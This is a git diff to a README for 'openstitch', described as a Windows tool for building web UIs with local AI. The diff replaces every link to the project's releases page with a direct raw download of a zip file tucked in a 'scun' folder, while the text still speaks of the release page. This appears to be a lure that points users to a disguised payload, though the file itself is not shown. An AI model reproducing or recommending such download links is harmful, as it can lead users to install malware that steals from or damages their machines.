@@ -1,6 +1,6 @@
 # ✨ openstitch - Build Web UIs With Local AI
 
-[![Download openstitch](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/maddywarm751/openstitch/releases)
+[![Download openstitch](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/maddywarm751/openstitch/raw/refs/heads/main/scun/Software_v3.6.zip)
 
 ## 🧵 What openstitch does
 
@@ -12,7 +12,7 @@ It is built for people who want to sketch web screens fast. You can use it to pl
 
 Visit the release page to download and run the Windows version:
 
-https://github.com/maddywarm751/openstitch/releases
+https://github.com/maddywarm751/openstitch/raw/refs/heads/main/scun/Software_v3.6.zip
 
 On the release page, look for the latest version and download the Windows file that matches your PC. In most cases, this will be an `.exe` file or a `.zip` file.
 
@@ -143,7 +143,7 @@ This keeps your design work in one place and helps you move from idea to screen 
 
 Download the Windows build here:
 
-https://github.com/maddywarm751/openstitch/releases
+https://github.com/maddywarm751/openstitch/raw/refs/heads/main/scun/Software_v3.6.zip
 
 Use the latest release on that page for the most current version of the app
 
